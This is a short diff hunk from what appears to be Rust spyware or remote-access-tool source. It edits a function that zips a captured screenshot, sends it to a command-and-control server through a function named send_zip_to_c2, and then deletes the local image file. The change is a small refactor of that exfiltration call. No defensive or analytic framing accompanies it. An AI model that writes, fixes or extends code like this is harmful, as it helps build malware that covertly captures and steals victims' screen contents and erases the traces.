@@ -43,7 +43,7 @@ async fn process_screenshot(png_path: &PathBuf) -> Result<(), Box<dyn std::error
     let zip_file = zip_file(png_path).await?;
     let zip_path = zip_file.path();
 
-    connexion::send_zip_to_c2(zip_path.to_str().ok_or("Chemin ZIP invalide")?).await?;
+    connexion::send_zip_to_c2(zip_path).await?;
 
     std::fs::remove_file(png_path)?;
 
